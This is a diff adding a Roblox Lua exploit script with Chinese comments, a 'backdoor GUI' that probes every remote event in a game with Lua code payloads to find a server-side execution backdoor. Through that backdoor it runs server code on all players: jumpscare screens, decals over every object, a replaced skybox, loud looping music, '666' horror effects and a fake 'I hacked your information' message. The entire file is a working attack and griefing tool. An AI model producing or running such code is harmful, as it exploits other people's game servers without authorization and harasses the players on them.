@@ -1,0 +1,878 @@
+-- 本地客户端后门UI脚本
+local Players = game:GetService("Players")
+local Player = Players.LocalPlayer
+local PlayerGui = Player:WaitForChild("PlayerGui")
+local CoreGui = game:GetService("CoreGui")
+local Workspace = game:GetService("Workspace")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Lighting = game:GetService("Lighting")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+
+-- 后门检测系统
+local dateTimeNow = DateTime.now
+local tableFind = table.find
+local taskSpawn = task.spawn
+local taskWait = task.wait
+local mathRandom = math.random
+
+local attached = false
+local backdoor = nil
+local remoteCodes = {}
+local STRING_VALUE_NAME = mathRandom(1000000, 9999999)
+
+local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local JointsService = game:GetService("JointsService")
+
+-- 通知系统
+local function notify(text)
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+        Title = "黑迪客后门GUI",
+        Duration = 3,
+        Text = text
+    })
+end
+
+-- 验证远程对象
+local function validRemote(rm)
+    local Parent = rm.Parent
+    local class = rm.ClassName
+    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then
+        return false
+    end
+    
+    if Parent then
+        if Parent == JointsService then
+            return false
+        end
+        if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or 
+           (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then
+            return false
+        end
+    end
+    
+    if rm:IsDescendantOf(RobloxReplicatedStorage) then
+        return false
+    end
+    
+    return true
+end
+
+-- 扫描后门
+local function scanGame()
+    local found = false
+    local commonPlaces = {ReplicatedStorage, Workspace, Lighting}
+    
+    -- 扫描常见位置
+    for i = 1, #commonPlaces do
+        local place = commonPlaces[i]
+        local descendance = place:GetDescendants()
+        for i = 1, #descendance do
+            local descendant = descendance[i]
+            if not validRemote(descendant) then
+                continue
+            end
+            
+            local remoteCode = tostring(mathRandom(100000, 999999))
+            remoteCodes[remoteCode] = descendant
+            
+            local remoteClass = descendant.ClassName
+            local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
+            
+            if remoteClass == "RemoteEvent" then
+                descendant:FireServer(requireScript)
+            elseif remoteClass == "RemoteFunction" then
+                local waiting = true
+                taskSpawn(function()
+                    descendant:InvokeServer(requireScript)
+                    waiting = nil
+                end)
+                
+                local start = dateTimeNow().UnixTimestampMillis
+                while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
+                    taskWait()
+                end
+            end
+            
+            if Workspace:FindFirstChild(STRING_VALUE_NAME) then
+                attached = true
+                backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
+                backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME))
+                return true
+            end
+        end
+    end
+    
+    -- 扫描整个游戏
+    if not found then
+        local children = game:GetChildren()
+        for i = 1, #children do
+            local child = children[i]
+            if tableFind(commonPlaces, child) then
+                continue
+            end
+            
+            local descendance = child:GetDescendants()
+            for i = 1, #descendance do
+                local descendant = descendance[i]
+                if not validRemote(descendant) then
+                    continue
+                end
+                
+                local remoteCode = tostring(mathRandom(100000, 999999))
+                remoteCodes[remoteCode] = descendant
+                
+                local remoteClass = descendant.ClassName
+                local requireScript = ("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'"):format(STRING_VALUE_NAME, remoteCode)
+                
+                if remoteClass == "RemoteEvent" then
+                    descendant:FireServer(requireScript)
+                elseif remoteClass == "RemoteFunction" then
+                    local waiting = true
+                    taskSpawn(function()
+                        descendant:InvokeServer(requireScript)
+                        waiting = nil
+                    end)
+                    
+                    local start = dateTimeNow().UnixTimestampMillis
+                    while waiting and 1000 > dateTimeNow().UnixTimestampMillis - start do
+                        taskWait()
+                    end
+                end
+                
+                if Workspace:FindFirstChild(STRING_VALUE_NAME) then
+                    attached = true
+                    backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
+                    backdoor:FireServer(("game.Workspace['%s']:Destroy()"):format(STRING_VALUE_NAME))
+                    return true
+                end
+            end
+        end
+    end
+    
+    return false
+end
+
+-- 自动检测并执行功能
+local function autoDetectAndExecute(scriptCode, successMessage)
+    if not attached or not backdoor then
+        notify("正在检测后门...")
+        if not scanGame() then
+            notify("❌ 未找到后门！")
+            return false
+        end
+        notify("✅ 后门已找到！")
+        taskWait(0.5)
+    end
+    
+    if backdoor.ClassName == "RemoteEvent" then
+        backdoor:FireServer(scriptCode)
+    elseif backdoor.ClassName == "RemoteFunction" then
+        backdoor:InvokeServer(scriptCode)
+    end
+    
+    if successMessage then
+        notify(successMessage)
+    end
+    
+    return true
+end
+
+-- 音乐按钮数据
+local musicButtonsData = {
+    {name = "TUPS9362音乐", soundId = "1839246734", playbackSpeed = 1.0},
+    {name = "k00lkiddify音乐", soundId = "1839246711", playbackSpeed = 0.8},
+    {name = "c00lkidd音乐", soundId = "104181508980428", playbackSpeed = 0.2},
+    {name = "无法逃脱TUPS9362", soundId = "8894394467", playbackSpeed = 1.0},
+    {name = "惊慌", soundId = "127097493971664", playbackSpeed = 1.0},
+    {name = "TUPS9362主题一", soundId = "101841916671193", playbackSpeed = 1.0},
+    {name = "跳跃风格二", soundId = "76578817848504", playbackSpeed = 1.0},
+    {name = "音乐：傻瓜", soundId = "102295928741521", playbackSpeed = 0.13}
+}
+
+-- 创建全新的黑迪客Gui
+local function CreateNewUI()
+    -- 获取屏幕尺寸
+    local screenSize = workspace.CurrentCamera.ViewportSize
+    
+    -- 创建主UI - 占屏幕60%
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "黑迪客后门"
+    ScreenGui.Parent = PlayerGui
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.ResetOnSpawn = false
+    
+    -- 主窗口 - 占屏幕60%大小
+    local MainFrame = Instance.new("Frame")
+    MainFrame.Name = "MainFrame"
+    MainFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
+    MainFrame.Position = UDim2.new(0.2, 0, 0.2, 0) -- 居中显示
+    MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+    MainFrame.BorderColor3 = Color3.fromRGB(100, 100, 100)
+    MainFrame.BorderSizePixel = 2
+    MainFrame.Parent = ScreenGui
+    
+    -- 标题栏（用于拖动，高度40px）
+    local TitleBar = Instance.new("Frame")
+    TitleBar.Name = "TitleBar"
+    TitleBar.Size = UDim2.new(1, 0, 0, 40)
+    TitleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    TitleBar.BorderSizePixel = 0
+    TitleBar.Parent = MainFrame
+    
+    -- 标题文字
+    local TitleLabel = Instance.new("TextLabel")
+    TitleLabel.Name = "TitleLabel"
+    TitleLabel.Size = UDim2.new(1, -10, 1, 0)
+    TitleLabel.Position = UDim2.new(0, 5, 0, 0)
+    TitleLabel.BackgroundTransparency = 1
+    TitleLabel.Text = "黑迪客后门"
+    TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    TitleLabel.TextSize = 18
+    TitleLabel.Font = Enum.Font.GothamBold
+    TitleLabel.Parent = TitleBar
+    
+    -- 检测后门按钮（简化版，放在标题栏右下角）
+    local DetectButton = Instance.new("TextButton")
+    DetectButton.Name = "DetectButton"
+    DetectButton.Size = UDim2.new(0, 60, 0, 30)
+    DetectButton.Position = UDim2.new(1, -65, 0.5, -15)
+    DetectButton.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+    DetectButton.BorderColor3 = Color3.fromRGB(150, 150, 150)
+    DetectButton.BorderSizePixel = 1
+    DetectButton.Text = "检测"
+    DetectButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    DetectButton.TextSize = 14
+    DetectButton.Font = Enum.Font.GothamBold
+    DetectButton.Parent = TitleBar
+    
+    -- 滚动框架 - 占剩余空间
+    local ScrollFrame = Instance.new("ScrollingFrame")
+    ScrollFrame.Name = "ScrollFrame"
+    ScrollFrame.Size = UDim2.new(1, -10, 1, -50)
+    ScrollFrame.Position = UDim2.new(0, 5, 0, 45)
+    ScrollFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    ScrollFrame.BorderSizePixel = 0
+    ScrollFrame.ScrollBarThickness = 8
+    ScrollFrame.ScrollBarImageColor3 = Color3.fromRGB(120, 120, 120)
+    ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, 1600)
+    ScrollFrame.ScrollBarImageTransparency = 0.3
+    ScrollFrame.Parent = MainFrame
+    
+    -- 按钮容器
+    local ButtonContainer = Instance.new("Frame")
+    ButtonContainer.Name = "ButtonContainer"
+    ButtonContainer.Size = UDim2.new(1, 0, 0, 1600)
+    ButtonContainer.BackgroundTransparency = 1
+    ButtonContainer.Parent = ScrollFrame
+    
+    -- 创建按钮的函数（增大按钮高度便于点击）
+    local function CreateButton(name, position, callback)
+        local Button = Instance.new("TextButton")
+        Button.Name = name
+        Button.Size = UDim2.new(1, -10, 0, 45) -- 按钮高度设为45px，便于点击
+        Button.Position = position
+        Button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        Button.BorderColor3 = Color3.fromRGB(100, 100, 100)
+        Button.BorderSizePixel = 1
+        Button.Text = name
+        Button.TextColor3 = Color3.fromRGB(255, 255, 255)
+        Button.TextSize = 14
+        Button.Font = Enum.Font.Gotham
+        Button.Parent = ButtonContainer
+        
+        -- 添加悬停效果
+        Button.MouseEnter:Connect(function()
+            Button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+        end)
+        
+        Button.MouseLeave:Connect(function()
+            Button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+        end)
+        
+        Button.MouseButton1Click:Connect(function()
+            callback()
+        end)
+        
+        return Button
+    end
+    
+    -- 功能按钮定义
+    local buttonY = 5
+    
+    -- 检测后门按钮（主按钮）
+    CreateButton("检测后门", UDim2.new(0, 5, 0, buttonY), function()
+        attached = false
+        backdoor = nil
+        remoteCodes = {}
+        STRING_VALUE_NAME = mathRandom(1000000, 9999999)
+        if scanGame() then
+            notify("✅ 后门已找到！")
+        else
+            notify("❌ 未找到后门！")
+        end
+    end)
+    
+    buttonY = buttonY + 55 -- 增大间距
+    
+    -- 所有玩家头顶图片功能
+    CreateButton("所有玩家头顶图片", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = [[
+            for _, targetPlayer in pairs(game:GetService("Players"):GetPlayers()) do
+                if targetPlayer.Character then
+                    local head = targetPlayer.Character:FindFirstChild("Head")
+                    if head then
+                        local billboardGui = Instance.new("BillboardGui")
+                        billboardGui.Adornee = head
+                        billboardGui.Size = UDim2.new(15, 0, 15, 0)
+                        billboardGui.StudsOffset = Vector3.new(0, 2, 0)
+                        billboardGui.AlwaysOnTop = true
+                        billboardGui.MaxDistance = 500
+                        billboardGui.Parent = head
+
+                        local imageLabel = Instance.new("ImageLabel")
+                        imageLabel.Size = UDim2.new(1, 0, 1, 0)
+                        imageLabel.BackgroundTransparency = 1
+                        imageLabel.Image = "http://www.roblox.com/asset/?id=131394090456182"
+                        imageLabel.ScaleType = Enum.ScaleType.Fit
+                        imageLabel.Parent = billboardGui
+                    end
+                end
+            end
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 所有玩家头顶图片已添加！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 其他玩家头顶图片功能
+    CreateButton("其他玩家头顶图片", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = string.format([[
+            for _, targetPlayer in pairs(game:GetService("Players"):GetPlayers()) do
+                if targetPlayer.Name ~= "%s" and targetPlayer.Character then
+                    local head = targetPlayer.Character:FindFirstChild("Head")
+                    if head then
+                        local billboardGui = Instance.new("BillboardGui")
+                        billboardGui.Adornee = head
+                        billboardGui.Size = UDim2.new(15, 0, 15, 0)
+                        billboardGui.StudsOffset = Vector3.new(0, 2, 0)
+                        billboardGui.AlwaysOnTop = true
+                        billboardGui.MaxDistance = 500
+                        billboardGui.Parent = head
+
+                        local imageLabel = Instance.new("ImageLabel")
+                        imageLabel.Size = UDim2.new(1, 0, 1, 0)
+                        imageLabel.BackgroundTransparency = 1
+                        imageLabel.Image = "http://www.roblox.com/asset/?id=131394090456182"
+                        imageLabel.ScaleType = Enum.ScaleType.Fit
+                        imageLabel.Parent = billboardGui
+                    end
+                end
+            end
+        ]], Player.Name)
+        
+        autoDetectAndExecute(scriptCode, "✅ 其他玩家头顶图片已添加！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 天空盒修改
+    CreateButton("修改天空盒", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = [[
+            local Lighting = game:GetService("Lighting")
+            if Lighting:FindFirstChild("Sky") then
+                Lighting.Sky:Destroy()
+            end
+
+            local newSky = Instance.new("Sky")
+            newSky.Name = "Sky"
+            newSky.Parent = Lighting
+
+            local imageId = "72367920666737"
+            newSky.SkyboxBk = "http://www.roblox.com/asset/?id=" .. imageId
+            newSky.SkyboxDn = "http://www.roblox.com/asset/?id=" .. imageId
+            newSky.SkyboxFt = "http://www.roblox.com/asset/?id=" .. imageId
+            newSky.SkyboxLf = "http://www.roblox.com/asset/?id=" .. imageId
+            newSky.SkyboxRt = "http://www.roblox.com/asset/?id=" .. imageId
+            newSky.SkyboxUp = "http://www.roblox.com/asset/?id=" .. imageId
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 天空盒已修改！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 粒子特效
+    CreateButton("粒子特效", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = [[
+            local Players = game:GetService("Players")
+            local particleTexture = "http://www.roblox.com/asset/?id=131394090456182"
+
+            for _, player in pairs(Players:GetPlayers()) do
+                local character = player.Character
+                if character then
+                    for _, part in pairs(character:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            local particleEmitter = Instance.new("ParticleEmitter")
+                            particleEmitter.Texture = particleTexture
+                            particleEmitter.Rate = 10
+                            particleEmitter.Lifetime = NumberRange.new(1, 2)
+                            particleEmitter.Parent = part
+                        end
+                    end
+                end
+            end
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 粒子特效已应用！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 所有物体贴图功能
+    CreateButton("所有物体贴图", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = [[
+            local decalTexture = "http://www.roblox.com/asset/?id=131394090456182"
+
+            -- 改变所有物体的贴图
+            local function applyDecalsToAllObjects()
+                local descendants = game.Workspace:GetDescendants()
+                for _, descendant in pairs(descendants) do
+                    if descendant:IsA("Part") or descendant:IsA("UnionOperation") then
+                        -- 为每个面添加贴图
+                        for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+                            local decal = Instance.new("Decal")
+                            decal.Face = face
+                            decal.Texture = decalTexture
+                            decal.ZIndex = 99
+                            decal.Parent = descendant
+                        end
+                    end
+                end
+            end
+
+            -- 执行贴图改变
+            applyDecalsToAllObjects()
+
+            -- 处理新创建的物体
+            game.Workspace.DescendantAdded:Connect(function(descendant)
+                wait(0.1) -- 稍等确保物体完全加载
+                if descendant:IsA("Part") or descendant:IsA("UnionOperation") then
+                    -- 为新物体添加贴图
+                    for _, face in pairs(Enum.NormalId:GetEnumItems()) do
+                        local decal = Instance.new("Decal")
+                        decal.Face = face
+                        decal.Texture = decalTexture
+                        decal.ZIndex = 99
+                        decal.Parent = descendant
+                    end
+                end
+            end)
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 所有物体贴图已应用！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 跳杀画面（移除音效）
+    CreateButton("跳杀画面", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = [[
+            local Players = game:GetService("Players")
+            
+            for _, targetPlayer in ipairs(Players:GetPlayers()) do
+                if targetPlayer:FindFirstChild("PlayerGui") then
+                    local ScreenGui = Instance.new("ScreenGui")
+                    local ImageLabel = Instance.new("ImageLabel")
+
+                    ScreenGui.Parent = targetPlayer.PlayerGui
+                    ScreenGui.IgnoreGuiInset = true
+                    ScreenGui.Name = "JumpScare"
+                    ScreenGui.ResetOnSpawn = false
+
+                    ImageLabel.Parent = ScreenGui
+                    ImageLabel.Size = UDim2.new(1, 0, 1, 0)
+                    ImageLabel.Image = "http://www.roblox.com/asset/?id=71608509918657"
+                    ImageLabel.BackgroundColor3 = Color3.new(0, 0, 0)
+                    ImageLabel.BackgroundTransparency = 0
+                    ImageLabel.ScaleType = Enum.ScaleType.Fit
+
+                    delay(5, function()
+                        if ScreenGui and ScreenGui.Parent then
+                            ScreenGui:Destroy()
+                        end
+                    end)
+                end
+            end
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 跳杀画面已执行！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 彩虹效果
+    CreateButton("彩虹效果", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = [[
+            local colorCorrection = Instance.new("ColorCorrectionEffect")
+            colorCorrection.Parent = game:GetService("Lighting")
+            colorCorrection.Enabled = true
+
+            spawn(function()
+                local counter = 0
+                while true do
+                    counter = counter + 0.01
+                    if counter > 1 then counter = 0 end
+
+                    local hue = counter
+                    local color = Color3.fromHSV(hue, 1, 1)
+
+                    colorCorrection.TintColor = color
+                    game:GetService("Lighting").Ambient = Color3.fromHSV(hue, 0.3, 0.8)
+
+                    wait(0.1)
+                end
+            end)
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 彩虹效果已应用！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 完整的666恐怖效果
+    CreateButton("666恐怖效果", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = [[
+            -- 完整的666恐怖效果
+            local function Apply666Effects()
+                local function ApplyEffectsToObject(object)
+                    for _, child in pairs(object:GetChildren()) do
+                        if child:IsA("BasePart") then
+                            -- 将部件变为黑色
+                            child.BrickColor = BrickColor.new("Really black")
+                            child.TopSurface = Enum.SurfaceType.Smooth
+                            child.BottomSurface = Enum.SurfaceType.Smooth
+
+                            -- 添加选择框
+                            local selectionBox = Instance.new("SelectionBox")
+                            selectionBox.Adornee = child
+                            selectionBox.Color = BrickColor.new("Really black")
+                            selectionBox.Parent = child
+
+                            -- 添加点光源
+                            local pointLight = Instance.new("PointLight")
+                            pointLight.Color = Color3.new(0.5, 0.5, 0.5)
+                            pointLight.Range = 15
+                            pointLight.Brightness = 5
+                            pointLight.Parent = child
+
+                            -- 创建BillboardGui和TextLabel
+                            local billboard = Instance.new("BillboardGui")
+                            billboard.Name = "stuf"
+                            billboard.Adornee = child
+                            billboard.Size = UDim2.new(2.5, 0, 2.5, 0)
+                            billboard.Parent = child
+
+                            local textLabel = Instance.new("TextLabel")
+                            textLabel.Text = "666 666 666 666 666 666"
+                            textLabel.Font = Enum.Font.SourceSansBold
+                            textLabel.TextSize = 48
+                            textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+                            textLabel.Size = UDim2.new(1, 0, 1.25, 0)
+                            textLabel.Position = UDim2.new(0, -22, -0.1, 0)
+                            textLabel.BackgroundTransparency = 1
+                            textLabel.Parent = billboard
+                        end
+
+                        -- 递归处理子对象
+                        if #child:GetChildren() > 0 then
+                            ApplyEffectsToObject(child)
+                        end
+                    end
+                end
+
+                -- 对整个工作空间应用效果
+                ApplyEffectsToObject(game.Workspace)
+
+                -- 对工作空间的直接子对象也应用效果
+                for _, obj in pairs(workspace:GetChildren()) do
+                    if obj:IsA("BasePart") then
+                        local billboard = Instance.new("BillboardGui")
+                        billboard.Name = "stuf"
+                        billboard.Adornee = obj
+                        billboard.Size = UDim2.new(2.5, 0, 2.5, 0)
+                        billboard.Parent = obj
+
+                        local textLabel = Instance.new("TextLabel")
+                        textLabel.Text = "666 666 666 666 666 666"
+                        textLabel.Font = Enum.Font.SourceSansBold
+                        textLabel.TextSize = 48
+                        textLabel.TextColor3 = Color3.new(0.8, 0.8, 0.8)
+                        textLabel.Size = UDim2.new(1, 0, 1.25, 0)
+                        textLabel.Position = UDim2.new(0, -22, -0.1, 0)
+                        textLabel.BackgroundTransparency = 1
+                        textLabel.Parent = billboard
+                    end
+                end
+            end
+
+            -- 调用函数以应用效果
+            Apply666Effects()
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 666恐怖效果已应用！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 提示1（永久显示）
+    CreateButton("提示1（永久）", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = [[
+            -- 创建永久Hint
+            local hint = Instance.new("Hint")
+            hint.Parent = game.Workspace
+            hint.Name = "PermanentHint1"
+            hint.Text = "我破解了你的信息 你现在在玩Roblox"
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 永久提示已添加！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 提示2（只显示10秒）
+    CreateButton("提示2（10秒）", UDim2.new(0, 5, 0, buttonY), function()
+        local scriptCode = [[
+            -- 创建临时Message，10秒后消失
+            local message = Instance.new("Message")
+            message.Parent = game.Workspace
+            message.Text = "我破解了你的信息 你现在在玩Roblox"
+            
+            -- 10秒后销毁Message
+            spawn(function()
+                wait(10)
+                if message and message.Parent then
+                    message:Destroy()
+                end
+            end)
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 临时提示已显示！")
+    end)
+    
+    buttonY = buttonY + 50
+    
+    -- 音乐控制区域标题
+    local MusicTitle = Instance.new("TextLabel")
+    MusicTitle.Name = "MusicTitle"
+    MusicTitle.Size = UDim2.new(1, -10, 0, 30)
+    MusicTitle.Position = UDim2.new(0, 5, 0, buttonY)
+    MusicTitle.BackgroundTransparency = 1
+    MusicTitle.Text = "音乐区"
+    MusicTitle.TextColor3 = Color3.fromRGB(200, 200, 200)
+    MusicTitle.TextSize = 16
+    MusicTitle.Font = Enum.Font.GothamBold
+    MusicTitle.Parent = ButtonContainer
+    
+    buttonY = buttonY + 35
+    
+    -- 添加音乐按钮
+    for i, musicData in ipairs(musicButtonsData) do
+        CreateButton(musicData.name, UDim2.new(0, 5, 0, buttonY), function()
+            local scriptCode = string.format([[
+                -- 停止所有现有音乐
+                for _, sound in pairs(game.Workspace:GetChildren()) do
+                    if sound:IsA("Sound") then
+                        sound:Stop()
+                        sound:Destroy()
+                    end
+                end
+                
+                -- 播放新音乐
+                local sound = Instance.new("Sound")
+                sound.SoundId = "rbxassetid://%s"
+                sound.PlaybackSpeed = %s
+                sound.Volume = 10
+                sound.Looped = true
+                sound.Parent = game.Workspace
+                sound:Play()
+                
+                -- 确保音乐循环播放
+                sound.Ended:Connect(function()
+                    sound:Play()
+                end)
+            ]], musicData.soundId, tostring(musicData.playbackSpeed))
+            
+            autoDetectAndExecute(scriptCode, "✅ 正在播放：" .. musicData.name)
+        end)
+        buttonY = buttonY + 50
+    end
+    
+    -- 清除所有效果按钮（黑色主题）
+    local ClearButton = Instance.new("TextButton")
+    ClearButton.Name = "清除所有效果"
+    ClearButton.Size = UDim2.new(1, -10, 0, 50)
+    ClearButton.Position = UDim2.new(0, 5, 0, buttonY)
+    ClearButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    ClearButton.BorderColor3 = Color3.fromRGB(100, 100, 100)
+    ClearButton.BorderSizePixel = 1
+    ClearButton.Text = "清除所有效果"
+    ClearButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    ClearButton.TextSize = 16
+    ClearButton.Font = Enum.Font.GothamBold
+    ClearButton.Parent = ButtonContainer
+    
+    ClearButton.MouseEnter:Connect(function()
+        ClearButton.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end)
+    
+    ClearButton.MouseLeave:Connect(function()
+        ClearButton.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    end)
+    
+    ClearButton.MouseButton1Click:Connect(function()
+        local scriptCode = [[
+            -- 清除天空盒
+            if game:GetService("Lighting"):FindFirstChild("Sky") then
+                game:GetService("Lighting").Sky:Destroy()
+            end
+
+            -- 清除声音
+            for _, sound in pairs(game.Workspace:GetChildren()) do
+                if sound:IsA("Sound") then
+                    sound:Stop()
+                    sound:Destroy()
+                end
+            end
+
+            -- 清除粒子效果
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("ParticleEmitter") then
+                    obj:Destroy()
+                end
+            end
+
+            -- 清除BillboardGui
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("BillboardGui") then
+                    obj:Destroy()
+                end
+            end
+
+            -- 清除选择框
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("SelectionBox") then
+                    obj:Destroy()
+                end
+            end
+
+            -- 清除点光源
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("PointLight") then
+                    obj:Destroy()
+                end
+            end
+
+            -- 清除火焰效果
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("Fire") then
+                    obj:Destroy()
+                end
+            end
+
+            -- 清除屏幕GUI
+            for _, targetPlayer in pairs(game:GetService("Players"):GetPlayers()) do
+                if targetPlayer:FindFirstChild("PlayerGui") then
+                    for _, gui in pairs(targetPlayer.PlayerGui:GetChildren()) do
+                        if gui.Name == "JumpScare" then
+                            gui:Destroy()
+                        end
+                    end
+                end
+            end
+
+            -- 清除提示（包括永久提示）
+            for _, hint in pairs(game.Workspace:GetChildren()) do
+                if hint:IsA("Hint") or hint:IsA("Message") then
+                    hint:Destroy()
+                end
+            end
+
+            -- 清除贴图
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("Decal") then
+                    obj:Destroy()
+                end
+            end
+
+            -- 恢复光照设置
+            game:GetService("Lighting").Ambient = Color3.new(0.5, 0.5, 0.5)
+
+            -- 清除颜色校正效果
+            for _, effect in pairs(game:GetService("Lighting"):GetChildren()) do
+                if effect:IsA("ColorCorrectionEffect") then
+                    effect:Destroy()
+                end
+            end
+
+            -- 恢复部件颜色
+            for _, obj in pairs(workspace:GetDescendants()) do
+                if obj:IsA("BasePart") then
+                    obj.BrickColor = BrickColor.new("Medium stone grey")
+                    obj.TopSurface = Enum.SurfaceType.Studs
+                    obj.BottomSurface = Enum.SurfaceType.Inlet
+                end
+            end
+        ]]
+        
+        autoDetectAndExecute(scriptCode, "✅ 所有效果已清除！")
+    end)
+    
+    -- 拖动功能（通过标题栏拖动）
+    local dragging = false
+    local dragStart
+    local startPos
+    
+    TitleBar.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+           input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = MainFrame.Position
+        end
+    end)
+    
+    TitleBar.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or 
+           input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+    
+    TitleBar.InputChanged:Connect(function(input)
+        if (input.UserInputType == Enum.UserInputType.MouseMovement or 
+            input.UserInputType == Enum.UserInputType.Touch) and dragging then
+            local delta = input.Position - dragStart
+            MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, 
+                                           startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    
+    -- 检测按钮功能（标题栏上的小按钮）
+    DetectButton.MouseButton1Click:Connect(function()
+        attached = false
+        backdoor = nil
+        remoteCodes = {}
+        STRING_VALUE_NAME = mathRandom(1000000, 9999999)
+        if scanGame() then
+            notify("✅ 后门已找到！")
+        else
+            notify("❌ 未找到后门！")
+        end
+    end)
+end
+
+-- 创建新UI
+CreateNewUI()
